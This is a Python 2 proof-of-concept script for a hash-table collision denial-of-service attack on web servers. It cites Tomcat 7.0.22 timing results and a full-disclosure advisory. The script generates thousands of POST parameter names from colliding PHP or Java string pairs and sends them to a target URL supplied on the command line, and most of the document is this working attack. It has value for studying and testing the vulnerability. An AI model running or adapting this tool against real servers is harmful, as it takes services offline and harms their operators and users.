"""
DoS through hash table
----------------------

tomcat 7.0.22.0

lparams=20, nparams=10000

parametri | tempo (s)
-----------------
 5000         3.3
10000        26.0        
20000        83.5
40000       348.1

ref: http://permalink.gmane.org/gmane.comp.security.full-disclosure/83694
"""

def random_permutations(collisions, n, random):
    while True:
        yield [random.choice(collisions) for i in range(n)]

def generate_random_parameters(collisions, nparams, lparams):
    from random import Random
    generator = random_permutations(collisions, lparams, Random()) 
    keys = [ "".join(generator.next()) for i in range(nparams)]
    values = range(nparams)
    return dict(zip(keys, values))

def post(url, parameters):
    from urllib import urlencode, urlopen
    urlencoded_parameters = urlencode(parameters)
    opened_url = urlopen(url, urlencoded_parameters)
    return opened_url.read()

if __name__ == "__main__":
    from sys import exit
    from optparse import OptionParser

    parser = OptionParser(version="1.0beta")
    parser.add_option("-v", dest="verbose", action="store_true", )
    parser.add_option("-n", dest="nparams", default=10000, type=int)
    parser.add_option("-l", dest="lparams", default=20, type=int)
    parser.add_option("-d", dest="dump", action="store_true", help="only output generated parameters")
    (options, args) = parser.parse_args()
    # PHP: 
    collisions = ['xz', 'yY', 'z8']
    # JAVA: collisions = [ "gq", "hR", "i3" ]
    parameters = generate_random_parameters(collisions, options.nparams, options.lparams)

    if options.verbose:
        print "java.lang.String with same hashcode", collisions
        print "number of parameters", options.nparams
        print "length of parameters", options.lparams
        print "unique parameters", len(parameters) 

    if options.dump:
        for x in parameters.keys(): 
            print(x)
        exit(0)

    if len(args) != 1:
        parser.error("missing target url")

    target_url = args[0]
    response_body = post(target_url, parameters)
    if options.verbose:
        print response_body

